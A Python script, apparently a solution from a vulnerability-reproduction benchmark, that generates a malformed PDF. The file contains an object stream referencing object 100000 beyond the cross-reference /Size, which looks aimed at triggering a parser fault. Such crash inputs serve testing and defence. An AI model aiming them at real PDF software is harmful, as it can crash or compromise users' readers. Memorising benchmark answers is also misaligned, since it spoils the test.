import os
from typing import List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        def obj_header(num: int, gen: int = 0) -> bytes:
            return f"{num} {gen} obj\n".encode()

        def obj_footer() -> bytes:
            return b"\nendobj\n"

        # Build object stream (1 0 obj)
        # Contains two objects: 2 0 and 100000 0
        obj2_body = (
            b"<< /Type /Font /Subtype /Type1 /Name /F1 /BaseFont /Helvetica"
            b" /Encoding 100000 0 R /ToUnicode 100000 0 R >>"
        )
        obj100000_body = b"<<>>"

        # Index: pairs of "objnum offset"
        # Offsets are measured from after the index (i.e., beginning of concatenated objects data)
        # Place obj2 at offset 0, and obj100000 right after obj2 (plus a newline between them)
        sep_between_objs = b"\n"
        offset_obj2 = 0
        offset_obj100000 = len(obj2_body) + len(sep_between_objs)
        index_str = f"2 {offset_obj2} 100000 {offset_obj100000}\n".encode()
        first_val = len(index_str)

        objstm_content = index_str + obj2_body + sep_between_objs + obj100000_body
        objstm_length = len(objstm_content)

        obj1 = (
            obj_header(1) +
            b"<< /Type /ObjStm /N 2 /First " + str(first_val).encode() +
            b" /Length " + str(objstm_length).encode() + b" >>\n" +
            b"stream\n" +
            objstm_content + b"\n" +
            b"endstream" +
            obj_footer()
        )

        # Placeholder Info object 4 0
        obj4 = obj_header(4) + b"<<>>" + obj_footer()

        # Pages tree 5 0
        obj5 = (
            obj_header(5) +
            b"<< /Type /Pages /Count 1 /Kids [6 0 R] >>" +
            obj_footer()
        )

        # Page object 6 0
        obj6 = (
            obj_header(6) +
            b"<< /Type /Page /Parent 5 0 R /Resources << /Font << /F1 2 0 R >> >> "
            b"/MediaBox [0 0 200 200] /Contents 8 0 R >>" +
            obj_footer()
        )

        # Catalog 7 0
        obj7 = (
            obj_header(7) +
            b"<< /Type /Catalog /Pages 5 0 R >>" +
            obj_footer()
        )

        # Contents 8 0
        contents_stream = b"BT\n/F1 12 Tf\n72 720 Td\n(Hi) Tj\nET\n"
        obj8 = (
            obj_header(8) +
            b"<< /Length " + str(len(contents_stream)).encode() + b" >>\n" +
            b"stream\n" + contents_stream + b"endstream" +
            obj_footer()
        )

        # PDF header
        pdf_header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"

        # Assemble initial objects to compute offsets for xref
        parts: List[Tuple[int, bytes]] = []
        parts.append((0, pdf_header))  # special: 0 is header chunk; not an object

        # Order of objects before xref:
        # 1 0 obj (ObjStm)
        # 4 0 obj
        # 5 0 obj
        # 6 0 obj
        # 7 0 obj
        # 8 0 obj
        parts.append((1, obj1))
        parts.append((4, obj4))
        parts.append((5, obj5))
        parts.append((6, obj6))
        parts.append((7, obj7))
        parts.append((8, obj8))

        # Compute offsets
        offsets = {}
        cur = 0
        for num, blob in parts:
            if num != 0:
                offsets[num] = cur
            cur += len(blob)

        # XRef stream (3 0 obj)
        # Use W [1 4 4], Index [0 9) => 0..8 inclusive -> pair (0, 9)
        # Size must be >= highest obj + 1 -> 9
        # Entries type:
        # 0: free
        # 1: uncompressed at offset
        # 2: compressed object (in object stream)
        # We include entries for 0..8
        def enc_entry(t: int, f2: int, f3: int) -> bytes:
            return bytes([t]) + f2.to_bytes(4, "big") + f3.to_bytes(4, "big")

        # We'll place xref after previous objects
        off_xref = cur

        # Build xref entries in order 0..8
        xref_entries = []
        # 0 free
        xref_entries.append(enc_entry(0, 0, 0))
        # 1 at offsets[1]
        xref_entries.append(enc_entry(1, offsets[1], 0))
        # 2 compressed in object stream 1 at index 0
        xref_entries.append(enc_entry(2, 1, 0))
        # 3 (xref itself) at off_xref (to be correct)
        xref_entries.append(enc_entry(1, off_xref, 0))
        # 4..8 regular
        for i in range(4, 9):
            xref_entries.append(enc_entry(1, offsets[i], 0))

        xref_stream_data = b"".join(xref_entries)
        xref_dict = (
            b"<< /Type /XRef"
            b" /W [1 4 4]"
            b" /Index [0 9]"
            b" /Size 9"
            b" /Root 7 0 R"
            b" /Length " + str(len(xref_stream_data)).encode() +
            b" >>\n"
        )
        obj3 = (
            obj_header(3) +
            xref_dict +
            b"stream\n" + xref_stream_data + b"\nendstream" +
            obj_footer()
        )

        # Now assemble final file
        final_parts: List[bytes] = []
        for _, blob in parts:
            final_parts.append(blob)
        # Update of off_xref is already calculated (cur)
        # Append xref object
        final_parts.append(obj3)
        # startxref points to off_xref
        final_parts.append(b"startxref\n" + str(off_xref).encode() + b"\n%%EOF\n")

        return b"".join(final_parts)